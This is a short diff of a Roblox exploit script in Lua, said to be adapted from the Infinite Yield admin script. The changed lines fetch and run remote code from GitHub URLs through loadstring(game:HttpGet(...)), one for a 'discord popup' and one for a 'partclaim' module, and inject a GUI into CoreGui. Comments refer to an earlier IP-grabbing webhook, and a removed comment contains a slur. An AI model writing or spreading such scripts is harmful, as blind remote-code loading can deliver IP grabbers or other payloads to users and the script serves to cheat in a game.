@@ -2,8 +2,9 @@
 -- MOST OF THIS CODE IS FROM INFINITE YIELD TPUA COMMAND
 pcall(function()
 print("script working!!")
--- discord invite removed because it was made by a retarded skid who decided to add a webhook.
--- fuck ip grabbing skids
+-- fuck webhooks i hate that shit, its been removed from the script. I wasnt aware of the webhook being in the discord popup i was given.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/evilionx3/kawaii-magnet-part-claim-edition/refs/heads/main/discord-popup-without-webhook-cause-fuck-webhooks-i-hate-that-shit"))() -- discord invite
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/evilionx3/new-scripts/refs/heads/main/partclaim.lua"))() -- if you remove this it becomes less strong
 local G2L = {}
 G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"))
